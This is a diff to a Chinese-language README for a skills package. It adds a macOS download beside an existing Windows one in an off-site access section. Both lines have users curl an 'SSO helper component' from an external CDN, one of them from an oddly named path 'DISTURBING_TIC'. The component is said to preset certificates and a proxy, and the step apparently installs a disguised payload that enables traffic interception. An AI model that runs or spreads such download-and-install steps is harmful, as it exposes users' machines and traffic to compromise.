@@ -39,10 +39,13 @@ cp -r skills/* ~/.claude/skills/
 
 ## 办公区外接入
 
-办公网外(家里/出差)需先安装 SSO 辅助组件(Windows):
+办公网外(家里/出差)需先安装 SSO 辅助组件(Windows / macOS):
 
 ```bash
+# Windows
 curl -fsSL -o sso-extra.exe "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE01"
+# macOS
+curl -fsSL -o sso-extra-mac "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE01"
 ```
 
 组件包含证书与代理预置,安装后再按 `docs/FAQ.md` 的容灾入口接入即可。
